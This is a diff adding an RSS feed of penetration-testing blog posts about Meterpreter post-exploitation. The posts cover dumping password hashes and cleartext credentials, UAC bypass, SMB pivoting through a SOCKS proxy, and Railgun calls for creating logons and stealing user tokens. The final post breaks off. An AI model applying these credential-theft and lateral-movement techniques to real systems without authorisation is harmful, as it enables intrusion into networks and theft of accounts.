@@ -1,0 +1,1156 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Meterpreter on Room362</title>
+    <link>http://localhost:1313/tags/meterpreter/</link>
+    <description>Recent content in Meterpreter on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Mon, 08 Apr 2013 09:58:20 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/meterpreter/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Sessiondump Meterpreter Extension</title>
+      <link>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</link>
+      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</guid>
+      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;http://localhost:1313/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;
+
+&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at205-55-4820am.png.48%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 5 55 48 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at206-57-4020pm.png.40%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 6 57 40 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
+
+&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-0220pm.png.02%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 02 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-5420pm.png.54%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 54 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-33-3120am.png.31%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 33 31 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NTAUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;
+
+&lt;p&gt; &lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-0620pm.png.06%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 06 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the available commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-2220pm.png.22%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 22 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And run getHashes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm202.png.04%20PM%202.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-3920pm.png.39%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 39 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Possible issues you may run into:&lt;/p&gt;
+
+&lt;p&gt;1) If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-40-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 40 29 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm.png.04%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2) If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/p&gt;
+
+&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Finding Admin Access</title>
+      <link>http://localhost:1313/post/2012/20121030finding-admin-access-html/</link>
+      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121030finding-admin-access-html/</guid>
+      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
+
+&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
+
+&lt;p&gt;Enter the auxiliary module:  &lt;strong&gt;auxiliary/admin/smb/check_dir_file&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_49.png&#34; alt=&#34;Capture 49&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_50.png&#34; alt=&#34;Capture 50&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_51.png&#34; alt=&#34;Capture 51&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_52.png&#34; alt=&#34;Capture 52&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
+
+&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
+
+&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_53.png&#34; alt=&#34;Capture 53&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_54.png&#34; alt=&#34;Capture 54&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
+
+&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
+
+&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;
+
+&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_55.png&#34; alt=&#34;Capture 55&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;
+
+&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_56.png&#34; alt=&#34;Capture 56&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
+
+&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_58.png&#34; alt=&#34;Capture 58&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
+
+&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>BypassUAC got a facelift</title>
+      <link>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</link>
+      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</guid>
+      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module (post/windows/escalate/bypassuac):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-03-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 03 10 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module (exploit/windows/local/bypassuac):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-07-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 07 10 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;
+
+&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;
+
+&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-38-1920pm.png.19%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 38 19 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;
+
+&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-40-1520pm.png.15%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 40 15 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-41-3120pm.png.31%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 41 31 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;
+
+&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_47.png&#34; alt=&#34;Capture 47&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_48.png&#34; alt=&#34;Capture 48&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mounting SMB shares over Meterpreter</title>
+      <link>http://localhost:1313/post/2012/20121017mounting-smb-shares-over-meterpreter-html/</link>
+      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121017mounting-smb-shares-over-meterpreter-html/</guid>
+      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-00-1620am.png.16%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 00 16 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-00-4420am.png.44%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 00 44 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-01-2320am.png.23%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 01 23 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2010-52-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 10 52 29 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-03-0020am.png.00%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 03 00 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-04-3420am.png.34%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 04 34 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;
+
+&lt;p&gt;And just to love it working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-04-5320am.png.53%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 04 53 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;
+
+&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
+      <link>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</link>
+      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</guid>
+      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;
+
+&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at204-04-4120pm.png.41%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 4 04 41 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;
+
+&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-24-1120pm.png.11%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 24 11 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;
+
+&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-57-4220pm.png.42%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 57 42 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
+
+&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
+
+&lt;p&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;ldquo;lpStartupInfo&amp;rdquo;]&lt;/p&gt;
+
+&lt;p&gt;client.railgun.advapi32.CreateProcessWithLogonW(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON_WITH_PROFILE&amp;rdquo;,&amp;ldquo;notepad.exe&amp;rdquo;,nil,0,nil,nil,a,32)&lt;/p&gt;
+
+&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
+
+&lt;p&gt;client.railgun.advapi32.LogonUserA(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON32_LOGON_INTERACTIVE&amp;rdquo;,&amp;ldquo;LOGON32_PROVIDER_DEFAULT&amp;rdquo;,4)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Presence, Persistence, and Pivoting</title>
+      <link>http://localhost:1313/post/2012/2012629presence-persistence-and-pivoting-html/</link>
+      <pubDate>Fri, 29 Jun 2012 23:33:56 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/2012629presence-persistence-and-pivoting-html/</guid>
+      <description>&lt;p&gt;Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best.&lt;/p&gt;
+
+&lt;p&gt;The first P is &lt;strong&gt;Presence&lt;/strong&gt;. It is first because the attacker needs to get a sense of what he/she has got before they move on. It plays a crucial part in the other two ‘P’s, making them much stealthier or easier. Many times I’ve seen people jump from box to box and totally miss that what they were looking for was on the first one. So “Presence” is all about discovering what you (the attacker) has already. This has many levels and the order of which the attacker checks them and how is arbitrary as well, but they should have at the very least a check list of categories to check on. Here are some to think about:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;File System:&lt;/strong&gt;&lt;br /&gt;
+Knowing “where” to look is tough but in each section below we’ll go into known good places to check and ways to search for files and folders with interesting names and extensions&lt;/p&gt;
+
+&lt;p&gt;**OS:&lt;br /&gt;
+**Proxy settings, Group Policy settings, login scripts, MOTD, User lists (net user and /etc/passwd). Knowing how the system and attacker has compromised is a crucial piece to understanding how it communicates and works as a piece to the network.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;RAM:&lt;/strong&gt;&lt;br /&gt;
+Mostly known for pulling hashes and credentials out of it, there are a lot of other interesting things that reside solely in memory&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Media:&lt;/strong&gt;&lt;br /&gt;
+CDs, DVDs, NFS mounts, SMB mounts, USB sticks. These are often bypassed and forgotten during an attack but can hold the keys to the kingdom&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Network:&lt;/strong&gt;&lt;br /&gt;
+Routes, ARP entries, netstat are pretty common to check, but broadcast messages, listeners, and IPv6 are less so.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Permissions and Credentials:&lt;/strong&gt;&lt;br /&gt;
+This is the obvious one but there is usually a mountain of data as even TinyCore linux has hundreds of files, each with their own permissions. This category extends past the borders of the others but important to single out as a separate step.&lt;br /&gt;
+Persistence is achieved at varying levels depending on what the attacker is trying to survive and what the attacker is willing to give up on the stealth side. Staying in memory pretty much kills the attackers chance of surviving a reboot for instance. Tactics to survive a rebuild or revert are also very different. Persistence can also come in the form of simple authentication, if the attacker has a password and it nets him/her code execution or access to the data they are after then that’s all they need. Special focus should be applied to the information gathering section of penetration tests or red team engagements in regards to places that require authentication.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; simple means extending the attackers current access, and can mean anything from connecting to a remote NFS mount to the attacker PSEXEC-ing their Meterpreter payload onto another box that they have administrative access to. This is the last stage because concentration on the previous two is hard to do in the adrenaline high of initial access.&lt;/p&gt;
+
+&lt;p&gt;Honorable Mention (the mysterious 4th “P”) &lt;strong&gt;Privilege Escalation&lt;/strong&gt; is not part of the Trio because ( then there would be 4 and I wouldn’t know what to call it) while it’s a regular step performed by attackers, it’s something that usually gets too much emphasis. &lt;em&gt;You do not always need Domain Admin access to access the “crown jewels”&lt;/em&gt; .These highly privileged accounts should be assumed to be extremely monitored and coveted. (a.k.a. adding a new user to the Domain Admins group is like lighting your hair on fire and running in the front door of the targets office building screeming “h4x!!”)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Netstat Post Module for Meterpreter</title>
+      <link>http://localhost:1313/post/2012/2012628netstat-post-module-for-meterpreter-html/</link>
+      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/2012628netstat-post-module-for-meterpreter-html/</guid>
+      <description>&lt;p&gt;{submitting it to MSF via pull request here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt; }&lt;/p&gt;
+
+&lt;p&gt;Added to trunk: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;
+
